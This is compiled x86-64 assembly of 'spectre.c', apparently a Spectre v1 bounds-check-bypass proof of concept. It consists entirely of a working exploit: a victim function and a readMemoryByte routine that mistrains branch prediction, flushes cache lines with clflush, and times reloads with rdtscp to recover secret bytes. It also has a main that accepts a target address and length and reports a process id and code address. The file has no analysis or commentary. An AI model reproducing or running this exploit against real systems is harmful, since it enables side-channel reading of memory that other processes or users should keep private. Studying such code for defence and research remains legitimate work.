	.file	"spectre.c"
	.text
	.globl	check
	.type	check, @function
check:
.LFB5689:
	.cfi_startproc
	endbr64
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rdi, %rax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5689:
	.size	check, .-check
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5690:
	.cfi_startproc
	movl	array1_size(%rip), %eax
	cltq
	cmpq	%rdi, %rax
	jbe	.L2
	subl	$1, %edi
	js	.L2
	movzbl	temp(%rip), %ecx
	movslq	%edi, %rdx
	leaq	array2(%rip), %rdi
	leaq	array1(%rip), %rsi
.L4:
	movzbl	(%rsi,%rdx), %eax
	sall	$9, %eax
	cltq
	andb	(%rdi,%rax), %cl
	subq	$1, %rdx
	testl	%edx, %edx
	jns	.L4
	movb	%cl, temp(%rip)
.L2:
	ret
	.cfi_endproc
.LFE5690:
	.size	victim_function, .-victim_function
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5691:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$56, %rsp
	.cfi_def_cfa_offset 112
	movq	%rdi, 24(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 40(%rsp)
	xorl	%eax, %eax
	movl	$0, 32(%rsp)
	leaq	results(%rip), %rax
	leaq	1024(%rax), %rdx
.L7:
	movl	$0, (%rax)
	addq	$4, %rax
	cmpq	%rdx, %rax
	jne	.L7
	movl	$999, 20(%rsp)
	leaq	131072+array2(%rip), %r13
	leaq	-131072(%r13), %r12
	leaq	array1(%rip), %r14
	jmp	.L8
.L10:
	movslq	%ebx, %rax
	imulq	$715827883, %rax, %rax
	shrq	$32, %rax
	movl	%ebx, %edx
	sarl	$31, %edx
	subl	%edx, %eax
	leal	(%rax,%rax,2), %edx
	addl	%edx, %edx
	movl	%ebx, %eax
	subl	%edx, %eax
	subl	$1, %eax
	movw	$0, %ax
	cltq
	movq	%rax, %rdi
	shrq	$16, %rdi
	orq	%rax, %rdi
	andq	8(%rsp), %rdi
	xorq	%r15, %rdi
	call	victim_function
	subl	$1, %ebx
	cmpl	$-1, %ebx
	je	.L23
.L12:
	clflush	array1_size(%rip)
	movl	$0, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jg	.L10
.L11:
	movl	36(%rsp), %eax
	addl	$1, %eax
	movl	%eax, 36(%rsp)
	movl	36(%rsp), %eax
	cmpl	$99, %eax
	jle	.L11
	jmp	.L10
.L23:
	movl	$13, %esi
	leaq	results(%rip), %r9
	jmp	.L14
.L25:
	movslq	%r8d, %r8
	addl	$1, (%r9,%r8,4)
.L13:
	addl	$167, %esi
	cmpl	$42765, %esi
	je	.L24
.L14:
	movzbl	%sil, %r8d
	movl	%r8d, %r10d
	sall	$9, %r10d
	rdtscp
	movq	%rax, %rdi
	movl	%ecx, 32(%rsp)
	salq	$32, %rdx
	orq	%rdx, %rdi
	movslq	%r10d, %r10
	movzbl	(%r12,%r10), %eax
	rdtscp
	movl	%ecx, 32(%rsp)
	salq	$32, %rdx
	orq	%rdx, %rax
	subq	%rdi, %rax
	cmpq	$50, %rax
	ja	.L13
	movl	array1_size(%rip), %ecx
	movl	%ebp, %eax
	cltd
	idivl	%ecx
	movslq	%edx, %rdx
	movzbl	(%r14,%rdx), %eax
	cmpl	%r8d, %eax
	jne	.L25
	jmp	.L13
.L24:
	subl	$1, 20(%rsp)
	je	.L15
.L8:
	movl	20(%rsp), %ebp
	leaq	array2(%rip), %rax
.L9:
	clflush	(%rax)
	addq	$512, %rax
	cmpq	%rax, %r13
	jne	.L9
	movl	array1_size(%rip), %ecx
	movl	%ebp, %eax
	cltd
	idivl	%ecx
	movslq	%edx, %r15
	movl	$29, %ebx
	movq	24(%rsp), %rax
	xorq	%r15, %rax
	movq	%rax, 8(%rsp)
	jmp	.L12
.L15:
	movl	results(%rip), %eax
	xorl	32(%rsp), %eax
	movl	%eax, results(%rip)
	movq	40(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L26
	addq	$56, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L26:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5691:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.8,"aMS",@progbits,1
	.align 8
.LC0:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"%p"
.LC2:
	.string	"%d"
	.section	.rodata.str1.8
	.align 8
.LC3:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC4:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.8
	.align 8
.LC5:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.section	.rodata.str1.1
.LC6:
	.string	"result[%d]=%d "
.LC7:
	.string	"\n"
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.text
	.globl	main
	.type	main, @function
main:
.LFB5692:
	.cfi_startproc
	endbr64
	pushq	%r15
	.cfi_def_cfa_offset 16
	.cfi_offset 15, -16
	pushq	%r14
	.cfi_def_cfa_offset 24
	.cfi_offset 14, -24
	pushq	%r13
	.cfi_def_cfa_offset 32
	.cfi_offset 13, -32
	pushq	%r12
	.cfi_def_cfa_offset 40
	.cfi_offset 12, -40
	pushq	%rbp
	.cfi_def_cfa_offset 48
	.cfi_offset 6, -48
	pushq	%rbx
	.cfi_def_cfa_offset 56
	.cfi_offset 3, -56
	subq	$72, %rsp
	.cfi_def_cfa_offset 128
	movl	%edi, 4(%rsp)
	movq	%rsi, 8(%rsp)
	movq	%fs:40, %rax
	movq	%rax, 56(%rsp)
	xorl	%eax, %eax
	leaq	.LC6(%rip), %r13
.L28:
	movq	stdin(%rip), %rdi
	call	getc@PLT
	cmpb	$114, %al
	je	.L43
	cmpb	$10, %al
	je	.L28
	cmpb	$105, %al
	jne	.L37
	movl	$0, %eax
	call	getpid@PLT
	movl	%eax, %ecx
	leaq	33+check(%rip), %rdx
	leaq	.LC8(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	jmp	.L28
.L43:
	movq	secret(%rip), %rdx
	movq	%rdx, %rcx
	leaq	.LC0(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movq	secret(%rip), %rdi
	leaq	array1(%rip), %rdx
	movq	%rdi, %rax
	subq	%rdx, %rax
	movq	%rax, 32(%rsp)
	call	strlen@PLT
	movl	%eax, 28(%rsp)
	leaq	array2(%rip), %rax
	leaq	131072(%rax), %rdx
.L30:
	movb	$1, (%rax)
	addq	$1, %rax
	cmpq	%rdx, %rax
	jne	.L30
	cmpl	$3, 4(%rsp)
	je	.L44
.L31:
	movl	28(%rsp), %edx
	leaq	.LC4(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	js	.L28
	movl	$0, %r14d
	leaq	.LC5(%rip), %r15
	jmp	.L35
.L44:
	leaq	32(%rsp), %rdx
	movq	8(%rsp), %rbx
	movq	8(%rbx), %rdi
	leaq	.LC1(%rip), %rsi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	leaq	array1(%rip), %rax
	subq	%rax, 32(%rsp)
	leaq	28(%rsp), %rdx
	movq	16(%rbx), %rdi
	leaq	.LC2(%rip), %rsi
	movl	$0, %eax
	call	__isoc99_sscanf@PLT
	movl	28(%rsp), %ecx
	movq	32(%rsp), %rdx
	leaq	.LC3(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	jmp	.L31
.L46:
	movq	%r13, %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movl	(%rbx), %ecx
	movl	%ebp, %edx
	movq	%r13, %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
.L33:
	addl	$1, %ebp
	addq	$4, %rbx
	cmpl	$256, %ebp
	je	.L45
.L34:
	leal	-1(%rbp), %edx
	movl	-4(%rbx), %ecx
	movl	(%rbx), %eax
	cmpl	%eax, %ecx
	jle	.L33
	movl	%ecx, %esi
	subl	%eax, %esi
	cmpl	$100, %esi
	jle	.L33
	jmp	.L46
.L45:
	leaq	.LC7(%rip), %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movl	28(%rsp), %eax
	subl	$1, %eax
	movl	%eax, 28(%rsp)
	addq	$1, %r14
	testl	%eax, %eax
	js	.L28
.L35:
	movq	secret(%rip), %rax
	movsbl	(%rax,%r14), %ecx
	movl	%ecx, %r8d
	movq	32(%rsp), %rdx
	movq	%r15, %rsi
	movl	$1, %edi
	movl	$0, %eax
	call	__printf_chk@PLT
	movq	32(%rsp), %rdi
	leaq	1(%rdi), %rax
	movq	%rax, 32(%rsp)
	leaq	44(%rsp), %rdx
	leaq	54(%rsp), %rsi
	call	readMemoryByte
	leaq	4+results(%rip), %rbx
	movl	$1, %ebp
	jmp	.L34
.L37:
	movq	56(%rsp), %rax
	subq	%fs:40, %rax
	jne	.L47
	movl	$0, %eax
	addq	$72, %rsp
	.cfi_remember_state
	.cfi_def_cfa_offset 56
	popq	%rbx
	.cfi_def_cfa_offset 48
	popq	%rbp
	.cfi_def_cfa_offset 40
	popq	%r12
	.cfi_def_cfa_offset 32
	popq	%r13
	.cfi_def_cfa_offset 24
	popq	%r14
	.cfi_def_cfa_offset 16
	popq	%r15
	.cfi_def_cfa_offset 8
	ret
.L47:
	.cfi_restore_state
	call	__stack_chk_fail@PLT
	.cfi_endproc
.LFE5692:
	.size	main, .-main
	.local	results
	.comm	results,1024,32